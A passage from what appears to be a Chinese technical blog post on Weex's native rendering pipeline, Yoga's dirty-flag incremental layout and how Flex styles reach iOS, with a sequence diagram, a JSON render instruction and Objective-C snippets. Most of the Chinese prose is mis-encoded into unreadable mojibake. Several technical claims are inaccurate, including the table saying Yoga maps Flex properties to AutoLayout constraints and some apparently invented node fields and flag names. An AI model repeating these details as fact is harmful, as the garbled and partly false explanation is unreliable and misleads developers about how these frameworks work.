<p>ç¬¬ä¸‰æ­¥ï¼ŒVirtual DOM çš„è§£æä¸ DOM æ ‘æ„å»ºã€‚Weex éœ€è¦æŠŠ Vue çš„ Virtual DOMï¼ˆJSON ç»“æ„ï¼‰è§£ææˆ Native ä¾§çš„ DOM èŠ‚ç‚¹ï¼ˆWXDOMNodeï¼‰ï¼Œè¿™éƒ¨åˆ†ç°åœ¨åœ¨ WXDOMCore ä¸­ï¼Œæ¯”å¦‚ createNode æ–¹æ³•ï¼Œå¤„ç†èŠ‚ç‚¹åˆ›å»ºã€å±æ€§æ›´æ–°ï¼Œè¿˜è¦ç»´æŠ¤ DOM æ ‘ç»“æ„ã€‚</p>
<p>ç¬¬å››æ­¥ï¼Œæ ·å¼è§£æä¸ Yoga å¸ƒå±€è®¡ç®—ã€‚Vue çš„æ ·å¼ï¼ˆæ¯”å¦‚ flexï¼‰è¦è¢« Weex è§£æï¼Œè½¬æ¢ä¸º Yoga çš„å¸ƒå±€å±æ€§ï¼Œç„¶ååœ¨ dom çº¿ç¨‹è®¡ç®—å¸ƒå±€ï¼Œè¿™éƒ¨åˆ†åœ¨ WXDOMCore çš„_scheduleLayout æ–¹æ³•ï¼Œè°ƒç”¨ Yoga çš„ calculateLayoutã€‚</p>
<p>ç¬¬äº”æ­¥ï¼Œæ¸²æŸ“æŒ‡ä»¤ç”Ÿæˆä¸ä¼ é€’ã€‚DOM å’Œå¸ƒå±€è®¡ç®—å®Œæˆåï¼Œè¦æŠŠç»“æœå°è£…æˆæ¸²æŸ“æŒ‡ä»¤ï¼ˆèŠ‚ç‚¹ IDã€frameã€ç±»å‹ç­‰ï¼‰ï¼Œé€šè¿‡ä¸»çº¿ç¨‹ä¼ é€’ç»™æ¸²æŸ“æ ¸å¿ƒï¼Œè¿™é‡Œæ˜¯ WXDOMCore çš„_notifyRender æ–¹æ³•ï¼Œåˆ‡æ¢åˆ° main queueã€‚</p>
<p>ç¬¬å…­æ­¥ï¼ŒåŸç”Ÿ UIKit å…ƒç´ çš„åˆ›å»ºä¸æ›´æ–°ã€‚æ¸²æŸ“æ ¸å¿ƒï¼ˆWXRenderCoreï¼‰æ¥æ”¶æŒ‡ä»¤ï¼Œåˆ›å»ºå¯¹åº” UIKit æ§ä»¶ï¼ˆUILabelã€UIImageView ç­‰ï¼‰ï¼Œæˆ–å¤ç”¨å·²æœ‰ Viewï¼Œæ›´æ–° frame å’Œæ ·å¼ï¼Œè¿™éƒ¨åˆ†åœ¨ WXRenderCore çš„ render æ–¹æ³•ï¼Œè¿˜æœ‰å…·ä½“çš„ View å·¥å‚ç±»ï¼ˆæ¯”å¦‚ WXViewFactoryï¼‰ã€‚</p>
<p>ç¬¬ä¸ƒæ­¥ï¼Œäº‹ä»¶ç»‘å®šä¸åå‘é€šä¿¡ã€‚åŸç”Ÿ UI çš„äº‹ä»¶ï¼ˆæ¯”å¦‚ç‚¹å‡»ï¼‰è¦ä¼ é€’å› Vueï¼ŒWeex éœ€è¦æ³¨å†Œ Native äº‹ä»¶ï¼Œé€šè¿‡ Bridge å›è°ƒ JSï¼Œè¿™é‡Œå¯¹åº” WXEventDispatcher å’Œ WXBridgeCore çš„ callbackJS æ–¹æ³•ã€‚</p>
<p>å…·ä½“çš„é€»è¾‘ä¸åšæ·±å…¥æ¢è®¨ï¼Œå¯ä»¥æŸ¥çœ‹æºç ç ”ç©¶ã€‚</p>
<h2 data-id="heading-1">äºŒã€Yoga</h2>
<h3 data-id="heading-2">1. æ”¯æŒ"å¢é‡å¸ƒå±€æ›´æ–°"</h3>
<p>å½“ç»„ä»¶æ ·å¼å˜åŒ–æ—¶ï¼ŒYoga ä»…é‡æ–°è®¡ç®—å—å½±å“çš„ç»„ä»¶æ ‘åˆ†æ”¯ï¼Œè€Œéå…¨é‡é‡ç®—ï¼Œå¤§å¹…å‡å°‘ RN åº”ç”¨çš„å¸ƒå±€è€—æ—¶å’Œå¡é¡¿ã€Yoga æ˜¯å¦‚ä½•å®ç°ä»…è®¡ç®—å—å½±å“çš„ç»„ä»¶æ ‘åˆ†æ”¯çš„ï¼Ÿç±»ä¼¼æœ‰ä¸ªæ‰“æ ‡è®°ï¼Œæ ‡è®°ä¸º dirtyï¼Ÿ</p>
<p>Yoga å®ç°å¢é‡å¸ƒå±€çš„æ ¸å¿ƒå°±æ˜¯ ã€ŒDirty æ ‡è®°æœºåˆ¶ã€+ã€Œç»„ä»¶æ ‘ä¾èµ–ä¼ æ’­ã€â€”â€” é€šè¿‡æ ‡è®° â€œå—å½±å“çš„èŠ‚ç‚¹â€ï¼Œå¹¶ä»…å¤„ç†è¿™äº›èŠ‚ç‚¹åŠå…¶å…³è”åˆ†æ”¯ï¼Œé¿å…å…¨é‡é‡ç®—ã€‚</p>
<h4 data-id="heading-3">1. YogaNode ä¸ Dirty çŠ¶æ€æ ‡è¯†</h4>
<p>Yoga ä¸­æ¯ä¸ªç»„ä»¶å¯¹åº”ä¸€ä¸ª YogaNodeï¼ˆå¸ƒå±€è®¡ç®—çš„æœ€å°å•å…ƒï¼‰ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½åŒ…å« 3 ä¸ªå…³é”®çŠ¶æ€æ ‡è®°ï¼ˆç”¨äºåˆ¤æ–­æ˜¯å¦éœ€è¦é‡ç®—ï¼‰ï¼š</p>
<ul>
<li>dirtyFlagsï¼ˆæ ¸å¿ƒæ ‡è®°ï¼‰ï¼šè®°å½•èŠ‚ç‚¹çš„ â€œè„çŠ¶æ€ç±»å‹â€ï¼Œä¸»è¦åˆ†ä¸¤ç±»ï¼š
<ul>
<li>LAYOUT_DIRTYï¼šèŠ‚ç‚¹è‡ªèº«æ ·å¼ï¼ˆå¦‚ widthã€flexï¼‰æˆ–å­èŠ‚ç‚¹å¸ƒå±€å˜åŒ–ï¼Œéœ€è¦é‡æ–°è®¡ç®—è‡ªèº«å¸ƒå±€ï¼›</li>
<li>MEASURE_DIRTYï¼šèŠ‚ç‚¹çš„æµ‹é‡ç›¸å…³å±æ€§ï¼ˆå¦‚ measureFunction è‡ªå®šä¹‰æµ‹é‡é€»è¾‘ï¼‰å˜åŒ–ï¼Œéœ€è¦å…ˆé‡æ–°æµ‹é‡å°ºå¯¸ï¼Œå†è®¡ç®—å¸ƒå±€ã€‚</li>
</ul>
</li>
<li>isLayoutCleanï¼šå¸ƒå°”å€¼ï¼Œå¿«é€Ÿåˆ¤æ–­èŠ‚ç‚¹æ˜¯å¦ â€œå¹²å‡€â€ï¼ˆæ— è„çŠ¶æ€ï¼‰ï¼Œé¿å…é‡å¤æ£€æŸ¥ dirtyFlagsï¼›</li>
<li>childCount + children æŒ‡é’ˆï¼šç»´æŠ¤å­èŠ‚ç‚¹åˆ—è¡¨ï¼Œç”¨äºåç»­éå†ä¾èµ–åˆ†æ”¯ã€‚</li>
</ul>
<h4 data-id="heading-4">2. è„çŠ¶æ€è§¦å‘ä¸ä¼ æ’­ï¼šä» â€œå˜åŒ–èŠ‚ç‚¹â€ åˆ° â€œæ ¹èŠ‚ç‚¹â€ çš„å†’æ³¡</h4>
<p>å½“ç»„ä»¶æ ·å¼å˜åŒ–æ—¶ï¼ˆå¦‚ RN ä¸­ä¿®æ”¹ style={{ flex: 2 }}ï¼‰ï¼ŒYoga ä¼šè§¦å‘ä»¥ä¸‹æµç¨‹ï¼š</p>
<ul>
<li>
<p>æ­¥éª¤ 1ï¼šæ ‡è®°è‡ªèº«ä¸º Dirty
ç›´æ¥ä¿®æ”¹å˜åŒ–èŠ‚ç‚¹çš„ dirtyFlags |= LAYOUT_DIRTYï¼ˆæˆ– MEASURE_DIRTYï¼‰ï¼ŒåŒæ—¶è®¾ç½® isLayoutClean = falseã€‚</p>
</li>
<li>
<p>æ­¥éª¤ 2ï¼šå‘ä¸Šå†’æ³¡é€šçŸ¥çˆ¶èŠ‚ç‚¹
ç”±äºçˆ¶èŠ‚ç‚¹çš„å¸ƒå±€ï¼ˆå¦‚å°ºå¯¸ã€ä½ç½®ï¼‰ä¾èµ–å­èŠ‚ç‚¹çš„å¸ƒå±€ç»“æœï¼ˆæ¯”å¦‚çˆ¶èŠ‚ç‚¹æ˜¯ flex:1ï¼Œå­èŠ‚ç‚¹å°ºå¯¸å˜åŒ–ä¼šå½±å“çˆ¶èŠ‚ç‚¹çš„å‰©ä½™ç©ºé—´åˆ†é…ï¼‰ï¼Œå› æ­¤ä¼šé€’å½’å‘ä¸Šéå†çˆ¶èŠ‚ç‚¹ï¼Œç›´åˆ°æ ¹èŠ‚ç‚¹ï¼Œå°†æ‰€æœ‰ â€œä¾èµ–èŠ‚ç‚¹â€ éƒ½æ ‡è®°ä¸º LAYOUT_DIRTYã€‚
å…³é”®ä¼˜åŒ–ï¼šçˆ¶èŠ‚ç‚¹ä»…æ ‡è®° â€œéœ€è¦é‡ç®—â€ï¼Œä½†ä¸ä¼šç«‹å³è®¡ç®—ï¼Œé¿å…ä¸­é€”é‡å¤è§¦å‘è®¡ç®—ã€‚</p>
</li>
<li>
<p>æ­¥éª¤ 3ï¼šè·³è¿‡å·²æ ‡è®°çš„èŠ‚ç‚¹
è‹¥æŸä¸ªèŠ‚ç‚¹å·²è¢«æ ‡è®°ä¸º Dirtyï¼Œåç»­é‡å¤è§¦å‘æ—¶ä¼šç›´æ¥è·³è¿‡ï¼ˆé¿å…é‡å¤å†’æ³¡ï¼‰ï¼Œæå‡æ•ˆç‡ã€‚</p>
</li>
</ul>
<h4 data-id="heading-5">3. å¸ƒå±€è®¡ç®—é˜¶æ®µï¼šåªå¤„ç† Dirty åˆ†æ”¯ï¼Œè·³è¿‡å¹²å‡€èŠ‚ç‚¹ï¼ˆDFSï¼‰</h4>
<p>å½“ Yoga è§¦å‘å¸ƒå±€è®¡ç®—ï¼ˆå¦‚ RN æ¸²æŸ“å¸§è§¦å‘ã€ç»„ä»¶æŒ‚è½½å®Œæˆï¼‰æ—¶ï¼Œä¼šä»æ ¹èŠ‚ç‚¹å¼€å§‹éå†ç»„ä»¶æ ‘ï¼Œä½†ä»…å¤„ç† â€œDirty èŠ‚ç‚¹åŠå…¶å­æ ‘â€ï¼š</p>
<ul>
<li>
<p>æ­¥éª¤ 1ï¼šæ ¹èŠ‚ç‚¹åˆ¤æ–­çŠ¶æ€
è‹¥æ ¹èŠ‚ç‚¹æ˜¯å¹²å‡€çš„ï¼ˆisLayoutClean = trueï¼‰ï¼Œç›´æ¥ç»ˆæ­¢è®¡ç®—ï¼ˆå…¨é‡è·³è¿‡ï¼‰ï¼›è‹¥ä¸º Dirtyï¼Œè¿›å…¥åˆ†æ”¯å¤„ç†ã€‚</p>
</li>
<li>
<p>æ­¥éª¤ 2ï¼šé€’å½’å¤„ç† Dirty åˆ†æ”¯
å¯¹æ¯ä¸ªèŠ‚ç‚¹ï¼Œå…ˆæ£€æŸ¥è‡ªèº«çŠ¶æ€ï¼š</p>
</li>
<li>
<p>è‹¥å¹²å‡€ï¼šç›´æ¥å¤ç”¨ä¸Šæ¬¡ç¼“å­˜çš„å¸ƒå±€ç»“æœï¼ˆx/y/width/heightï¼‰ï¼Œä¸é‡ç®—ï¼›</p>
</li>
<li>
<p>è‹¥ Dirtyï¼š</p>
<ul>
<li>å…ˆå¤„ç†å­èŠ‚ç‚¹ï¼šå¦‚æœå­èŠ‚ç‚¹æ˜¯ Dirtyï¼Œå…ˆé€’å½’è®¡ç®—å­èŠ‚ç‚¹å¸ƒå±€ï¼ˆä¿è¯çˆ¶èŠ‚ç‚¹è®¡ç®—æ—¶ä¾èµ–çš„å­èŠ‚ç‚¹æ•°æ®æ˜¯æœ€æ–°çš„ï¼‰ï¼›</li>
<li>å†è®¡ç®—è‡ªèº«å¸ƒå±€ï¼šæ ¹æ® Flex è§„åˆ™ï¼ˆå¦‚ flexDirectionã€justifyContentï¼‰å’Œå­èŠ‚ç‚¹å¸ƒå±€ç»“æœï¼Œè®¡ç®—è‡ªèº«çš„æœ€ç»ˆå°ºå¯¸å’Œä½ç½®ï¼›</li>
<li>æ¸…é™¤ Dirty æ ‡è®°ï¼šè®¡ç®—å®Œæˆåï¼Œè®¾ç½® dirtyFlags = 0ã€isLayoutClean = trueï¼Œæ ‡è®°ä¸ºå¹²å‡€ã€‚</li>
</ul>
</li>
<li>
<p>æ­¥éª¤ 3ï¼šå¢é‡æ›´æ–°çš„æ ¸å¿ƒæ•ˆæœ
æ¯”å¦‚ä¿®æ”¹ä¸€ä¸ªåˆ—è¡¨é¡¹çš„ marginï¼Œåªä¼šæ ‡è®°è¯¥åˆ—è¡¨é¡¹ â†’ çˆ¶åˆ—è¡¨å®¹å™¨ â†’ æ ¹èŠ‚ç‚¹ä¸º Dirtyï¼Œå…¶ä»–åˆ—è¡¨é¡¹ã€é¡µé¢å…¶ä»–ç»„ä»¶å‡ä¸ºå¹²å‡€ï¼Œä¼šç›´æ¥è·³è¿‡è®¡ç®—ï¼Œä»…é‡ç®— â€œåˆ—è¡¨é¡¹â†’çˆ¶å®¹å™¨â€ è¿™ä¸€å°åˆ†æ”¯ã€‚</p>
</li>
</ul>
<h3 data-id="heading-6">2. Flex å¸ƒå±€é€»è¾‘å¦‚ä½•åˆ° Native ç³»ç»Ÿ</h3>
<p>Flex å¸ƒå±€é€»è¾‘ï¼Œæˆ–è€…è¯´ DSLï¼Œæ˜¯å¦‚ä½•ç¿»è¯‘ä¸º iOS çš„ AutoLayout å’Œ Android çš„ LayoutParams çš„ï¼Ÿ</p>
<p>Yoga å…ˆå°† Flex DSL è§£æä¸ºç»Ÿä¸€çš„ã€Œå¸ƒå±€è®¡ç®—ç»“æœã€ï¼ˆèŠ‚ç‚¹çš„ x/y/width/heightã€é—´è·ã€å¯¹é½æ–¹å¼ç­‰ï¼‰ï¼Œå†æ ¹æ®å¹³å°å·®å¼‚ï¼Œå°†è®¡ç®—ç»“æœ â€œæ˜ å°„â€ ä¸ºå¯¹åº”å¹³å°çš„åŸç”Ÿå¸ƒå±€è§„åˆ™â€”â€”iOS æ˜ å°„ä¸º AutoLayout çº¦æŸï¼ŒAndroid æ˜ å°„ä¸º LayoutParams + åŸç”Ÿå¸ƒå±€å®¹å™¨å±æ€§ã€‚</p>
<h4 data-id="heading-7">1. ç¬¬ä¸€æ­¥ï¼šé€šç”¨å‰ç½®æµç¨‹ï¼ˆè·¨å¹³å°ç»Ÿä¸€ï¼‰</h4>
<p>æ— è®º iOS è¿˜æ˜¯ Androidï¼ŒYoga éƒ½ä¼šå…ˆå®Œæˆä»¥ä¸‹æ­¥éª¤ï¼Œå±è”½ Flex DSL çš„è§£æå·®å¼‚ï¼š</p>
<ol>
<li>è§£æ Flex æ ·å¼ï¼šå°†ä¸Šå±‚æ¡†æ¶çš„ Flex é…ç½®ï¼ˆå¦‚ RN çš„ StyleSheetã€Weex çš„æ¨¡æ¿æ ·å¼ï¼‰è§£æä¸º YogaNode çš„å±æ€§ï¼ˆå¦‚ flexDirectionã€justifyContentã€marginã€padding ç­‰ï¼‰ï¼›</li>
<li>æ‰§è¡Œå¸ƒå±€è®¡ç®—ï¼šé€šè¿‡ Flexbox ç®—æ³•ï¼ˆåŸºäº Web æ ‡å‡†ï¼‰ï¼Œè®¡ç®—å‡ºæ¯ä¸ª YogaNode çš„æœ€ç»ˆå¸ƒå±€æ•°æ®ï¼š</li>
</ol>
<ul>
<li>å›ºå®šå±æ€§ï¼šwidth/heightï¼ˆå« auto/flex è®¡ç®—åçš„å…·ä½“æ•°å€¼ï¼‰ã€x/yï¼ˆç›¸å¯¹çˆ¶èŠ‚ç‚¹çš„åæ ‡ï¼‰ï¼›</li>
<li>é—´è·å±æ€§ï¼šmarginLeft/Top/Right/Bottomã€paddingLeft/Top/Right/Bottomï¼›</li>
<li>å¯¹é½å±æ€§ï¼šalignItemsã€justifyContent å¯¹åº”çš„èŠ‚ç‚¹ç›¸å¯¹ä½ç½®å…³ç³»ï¼›</li>
</ul>
<ol start="3">
<li>è¾“å‡ºæ ‡å‡†åŒ–å¸ƒå±€æ•°æ®ï¼šå°†ä¸Šè¿°ç»“æœå°è£…ä¸ºå¹³å°æ— å…³çš„ç»“æ„ä½“ï¼Œä¾›åç»­å¹³å°æ˜ å°„ä½¿ç”¨ã€‚</li>
</ol>
<h4 data-id="heading-8">2. ç¬¬äºŒæ­¥ï¼šiOS ç«¯ï¼šæ˜ å°„ä¸º AutoLayout çº¦æŸï¼ˆNSLayoutConstraintï¼‰</h4>
<p>AutoLayout çš„æ ¸å¿ƒæ˜¯ã€ŒåŸºäºçº¦æŸçš„å…³ç³»æè¿°ã€ï¼ˆè€Œéç›´æ¥è®¾ç½®åæ ‡ï¼‰ï¼Œå› æ­¤ Yoga ä¼šå°† â€œè®¡ç®—å‡ºçš„å…·ä½“å°ºå¯¸ / ä½ç½®â€ è½¬åŒ–ä¸º UIView çš„çº¦æŸï¼ˆNSLayoutConstraintï¼‰ï¼Œæ ¸å¿ƒæ˜ å°„è§„åˆ™å¦‚ä¸‹ï¼šä¸€ä¸€ç¿»è¯‘ css è§„åˆ™åˆ° iOS AutoLayout å†™æ³•ï¼š</p>





































<table><thead><tr><th>Flex æ ¸å¿ƒå±æ€§</th><th>å¯¹åº”çš„ AutoLayout çº¦æŸé€»è¾‘</th></tr></thead><tbody><tr><td><code>width: 100</code></td><td>æ˜ å°„ä¸º <code>view.widthAnchor.constraint(equalToConstant: 100)</code></td></tr><tr><td><code>height: auto</code></td><td>å…ˆé€šè¿‡ Yoga è®¡ç®—å‡ºå…·ä½“é«˜åº¦ï¼ˆå¦‚æ–‡å­—é«˜åº¦ã€å­èŠ‚ç‚¹åŒ…è£¹é«˜åº¦ï¼‰ï¼Œå†æ˜ å°„ä¸º <code>heightAnchor</code> çº¦æŸï¼›è‹¥ä¸º <code>flex:1</code>ï¼Œåˆ™æ˜ å°„ä¸º <code>heightAnchor.constraint(equalTo: superview.heightAnchor, multiplier: 1)</code>ï¼ˆå æ»¡çˆ¶å®¹å™¨å‰©ä½™é«˜åº¦ï¼‰</td></tr><tr><td><code>marginLeft: 20</code></td><td>æ˜ å°„ä¸º <code>view.leadingAnchor.constraint(equalTo: superview.leadingAnchor, constant: 20)</code></td></tr><tr><td><code>marginTop: 15</code></td><td>æ˜ å°„ä¸º <code>view.topAnchor.constraint(equalTo: superview.topAnchor, constant: 15)</code></td></tr><tr><td><code>justifyContent: center</code>ï¼ˆçˆ¶èŠ‚ç‚¹ flexDirection: rowï¼‰</td><td>çˆ¶èŠ‚ç‚¹çº¦æŸï¼š<code>view.centerXAnchor.constraint(equalTo: superview.centerXAnchor)</code>ï¼›è‹¥æœ‰å¤šä¸ªå­èŠ‚ç‚¹ï¼Œé€šè¿‡è°ƒæ•´å­èŠ‚ç‚¹é—´çš„ <code>spacing</code> çº¦æŸå®ç°å‡åŒ€åˆ†å¸ƒ</td></tr><tr><td><code>alignItems: center</code>ï¼ˆçˆ¶èŠ‚ç‚¹ flexDirection: columnï¼‰</td><td>å­èŠ‚ç‚¹çº¦æŸï¼š<code>view.centerYAnchor.constraint(equalTo: superview.centerYAnchor)</code></td></tr><tr><td><code>flex: 1</code>ï¼ˆå­èŠ‚ç‚¹ï¼‰</td><td>æ˜ å°„ä¸º <code>view.widthAnchor.constraint(equalTo: superview.widthAnchor, multiplier: 1)</code>ï¼ˆæ¨ªå‘å æ»¡ï¼‰+ çˆ¶èŠ‚ç‚¹çš„ <code>distribution</code> çº¦æŸï¼ˆåˆ†é…å‰©ä½™ç©ºé—´ï¼‰</td></tr></tbody></table>
<p>è¡¥å……ä¿¡æ¯ï¼š</p>
<ul>
<li>Yoga ä¼šä¸ºæ¯ä¸ª <code>UIView</code> å…³è”ä¸€ä¸ª <code>YogaNode</code>ï¼Œå¸ƒå±€è®¡ç®—å®Œæˆåï¼Œé€šè¿‡ <code>YogaKit</code>ï¼ˆæˆ–ä¸Šå±‚æ¡†æ¶å¦‚ RN çš„åŸç”Ÿå±‚ï¼‰è‡ªåŠ¨ç”Ÿæˆçº¦æŸï¼›</li>
<li>æ”¯æŒ â€œçº¦æŸä¼˜å…ˆçº§â€ é€‚é…ï¼šæ¯”å¦‚ <code>flex:1</code> å¯¹åº”çš„çº¦æŸä¼˜å…ˆçº§ä¼šé«˜äºå›ºå®šå°ºå¯¸çº¦æŸï¼Œç¡®ä¿ Flex è§„åˆ™ä¼˜å…ˆç”Ÿæ•ˆï¼›</li>
<li>æ··åˆå¸ƒå±€å…¼å®¹ï¼šè‹¥åŸç”Ÿè§†å›¾å·²æœ‰éƒ¨åˆ† AutoLayout çº¦æŸï¼ŒYoga ä¼šç”Ÿæˆ â€œè¡¥å……çº¦æŸâ€ï¼Œé¿å…å†²çªï¼ˆé€šè¿‡ <code>active</code>å±æ€§æ§åˆ¶çº¦æŸå¯ç”¨ / ç¦ç”¨ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-9">ä¸‰ã€Weex å‰–æ</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant V as Vueç»„ä»¶
    participant J as JS Framework
    participant B as JS-Native Bridge
    participant N as Nativeå¼•æ“
    participant P as åŸç”ŸUI

    V-&gt;&gt;J: .vueå•æ–‡ä»¶ (template/style/script)
    Note right of J: ç¼–è¯‘é˜¶æ®µ&lt;br&gt;weex-loaderç¼–è¯‘Vueç»„ä»¶
    J-&gt;&gt;J: ç”ŸæˆVirtual DOMæ ‘
    Note right of J: è¿è¡Œé˜¶æ®µ&lt;br&gt;JS Frameworkç®¡ç†VNodeç”Ÿå‘½å‘¨æœŸ
    J-&gt;&gt;B: é€šè¿‡callNativeå‘é€&lt;br&gt;æ¸²æŸ“æŒ‡ä»¤JSON
    Note right of B: é€šä¿¡å±‚&lt;br&gt;å°†JSè°ƒç”¨è½¬ä¸ºåŸç”Ÿæ¨¡å—è°ƒç”¨
    B-&gt;&gt;N: ä¼ é€’æ¸²æŸ“æŒ‡ä»¤
    Note right of N: åŸç”Ÿæ¸²æŸ“å¼•æ“&lt;br&gt;WXRenderManager (Android)&lt;br&gt;WXComponent (iOS)
    N-&gt;&gt;N: è§£ææŒ‡ä»¤ï¼Œåˆ›å»º/æ›´æ–°ç»„ä»¶æ ‘
    N-&gt;&gt;P: è°ƒç”¨åŸç”ŸAPIæ¸²æŸ“&lt;br&gt;ï¼ˆe.g., UIView, TextViewï¼‰
    P-&gt;&gt;P: æœ€ç»ˆåŸç”Ÿè§†å›¾
</code></pre>
<p>ä¸‹é¢é’ˆå¯¹æ ¸å¿ƒæœºåˆ¶è¯¦è§£ä¸æºç å®šä½</p>
<h3 data-id="heading-10">1. ç¼–è¯‘é˜¶æ®µï¼šä» Vue åˆ° Virtual DOM</h3>
<ul>
<li>å¤„ç† Vue å•æ–‡ä»¶ï¼šå¼€å‘è€…çš„<code>.vue</code>æ–‡ä»¶é€šè¿‡ Webpack å’Œ <code>weex-loader</code> ç¼–è¯‘æˆ JavaScript Bundleã€‚è¿™ä¸ª Bundle åŒ…å«äº†æ¸²æŸ“é¡µé¢æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯</li>
<li>ç”ŸæˆVirtual DOMï¼šåœ¨JSè¿è¡Œæ—¶ï¼ŒVue.jsï¼ˆæˆ– Raxï¼‰çš„æ¸²æŸ“å‡½æ•°ä¼šç”Ÿæˆä¸€æ£µ Virtual DOMæ ‘ï¼ˆVNodeï¼‰ã€‚Weex çš„ JS Framework ä¼šæ‹¦æˆªå¸¸è§„çš„ DOM æ“ä½œï¼Œå°†å…¶å¯¼å‘ Weex çš„æ¸²æŸ“ç®¡é“</li>
</ul>
<p>æºç ç›¸å…³ï¼šç¼–è¯‘è¿‡ç¨‹ä¸»è¦æ¶‰åŠ <code>weex-loader</code> (åœ¨ <code>weex-toolkit</code> é¡¹ç›®ä¸­)ï¼Œè€Œ JS Framework å¯¹ VNode çš„å¤„ç†åœ¨ <code>js-framework</code> ç›®å½•ä¸‹ã€‚é‡ç‚¹å…³æ³¨ <code>src/framework.js</code> ä¸­çš„ <code>Document</code> å’Œ <code>Element</code> ç±»ï¼Œå®ƒä»¬æ¨¡æ‹Ÿäº† DOM ç»“æ„</p>
<h3 data-id="heading-11">2. æŒ‡ä»¤ç”Ÿæˆä¸é€šä¿¡</h3>
<ul>
<li>
<p>åºåˆ—åŒ–ä¸ºæ¸²æŸ“æŒ‡ä»¤ï¼ˆjson æ•°æ®ï¼‰ï¼šJS-Framework ä¸ä¼šç›´æ¥æ“ä½œ Domï¼Œè€Œæ˜¯æŠŠå¯¹ Dom çš„æ“ä½œï¼Œæè¿°æˆå¯¹ VNode å¯¹è±¡çš„åˆ›å»ºã€æ›´æ–°ã€åˆ é™¤ç­‰ï¼Œåºåˆ—åŒ–æˆä¸€ç§ç‰¹æ®Šçš„ JSON æ ¼å¼çš„æ¸²æŸ“æŒ‡ä»¤ã€‚æ¯”å¦‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"dom"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"method"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"createBody"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"ref"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"div"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"style"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>...<span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
</li>
<li>
<p>JS-Native æ¡¥æ¥ï¼šè¿™äº›æŒ‡ä»¤é€šè¿‡ callNative æ–¹æ³•ï¼Œä» JS ç«¯å‘é€åˆ° Native ç«¯ï¼ŒåŒæ—¶ Native ç«¯ä¹Ÿå¯ä»¥é€šè¿‡ callJS æ–¹æ³•å‘ JS ç«¯å‘é€äº‹ä»¶ï¼ˆæ¯”å¦‚ç”¨æˆ·ç‚¹å‡»ï¼‰</p>
</li>
</ul>
<h3 data-id="heading-12">3. åŸç”Ÿç«¯æ¸²æŸ“</h3>
<ul>
<li>æŒ‡ä»¤è§£æä¸ç»„ä»¶æ¸²æŸ“ï¼šNative ç«¯çš„æ¸²æŸ“å¼•æ“ï¼ˆå¦‚ Android çš„ WXRenderManger å’Œ iOS çš„ WXComponentManagerï¼‰æ¥æ”¶å¹¶è§£æ JS æŒ‡ä»¤ã€‚Weex ç»´æŠ¤äº†ä¸€ä¸ªä» JS ç»„ä»¶åˆ°åŸç”Ÿ UI ç»„ä»¶çš„æ˜ å°„è¡¨ã€‚ï¼ˆä¾‹å¦‚  æ˜ å°„åˆ° iOS çš„ UILabelï¼‰</li>
<li>å¸ƒå±€ä¸æ ·å¼ï¼šWeex ä½¿ç”¨çš„ Flexbox å¸ƒå±€æ¨¡å‹åšä¸ºç»Ÿä¸€çš„å¸ƒå±€æ–¹æ¡ˆï¼ŒNative ç«¯éœ€è¦å°† JS ä¼ é€’çš„ css æ ·å¼å±æ€§ï¼Œè½¬æ¢ä¸ºåŸç”Ÿç»„ä»¶èƒ½å¤Ÿç†è§£çš„å¸ƒå±€å‚æ•°ä¸æ ·å¼å±æ€§ã€‚</li>
<li>å¤šçº¿ç¨‹æ¨¡å‹ï¼šä¸ºäº†ä¿è¯ UI æµç•…ï¼ŒWeex é‡‡ç”¨äº†å¤šçº¿ç¨‹æ¨¡å‹ã€‚DOM æ“ä½œå’Œå¸ƒå±€è®¡ç®—é€šå¸¸åœ¨å•ç‹¬çš„ DOM çº¿ç¨‹è¿›è¡Œï¼Œè€Œæœ€ç»ˆåˆ›å»ºå’Œæ›´æ–°åŸç”Ÿè§†å›¾çš„æ“ä½œå¿…é¡»åœ¨ UI ä¸»çº¿ç¨‹ä¸Šè¿›è¡Œ</li>
</ul>
<h3 data-id="heading-13">4. æ‹“å±•æœºåˆ¶</h3>
<ul>
<li>æ¨¡å—ï¼ˆModuleï¼‰ï¼šç”¨äºæš´éœ²åŸç”Ÿèƒ½åŠ›ï¼ˆå¦‚ç½‘ç»œã€å­˜å‚¨ï¼‰ç»™å‰ç«¯è°ƒç”¨ï¼Œé€šè¿‡ callNative è§¦å‘ï¼Œæ”¯æŒå›è°ƒ</li>
<li>ç»„ä»¶ï¼ˆComponentï¼‰ï¼šæ‹“å±•è‡ªå®šä¹‰ UI ç»„ä»¶ï¼Œå…è®¸å¼€å‘è€…åˆ›å»ºè‡ªå®šä¹‰çš„åŸç”Ÿ UI ç»„ä»¶ï¼Œå¹¶åœ¨ JSX ä¸­ä½¿ç”¨</li>
<li>é€‚é…å™¨ï¼ˆAdapterï¼‰ï¼šæä¾›å¯æ›¿æ¢çš„å®ç°ï¼Œå¦‚å›¾ç‰‡ä¸‹è½½å™¨</li>
</ul>
<h2 data-id="heading-14">å››ã€ä¸ºä»€ä¹ˆè‡ªå®šä¹‰ Component éƒ½éœ€è¦ç»§æ‰¿è‡ª WXComponentï¼Ÿ</h2>
<p>æ¯”å¦‚ä¸‹é¢çš„ä»£ç </p>
<pre><code class="hljs language-objective-c" lang="objective-c">[self registerComponent:@"image" withClass:NSClassFromString(@"WXImageComponent") withProperties:nil];

@interface WXImageComponent : WXComponent

@end
</code></pre>
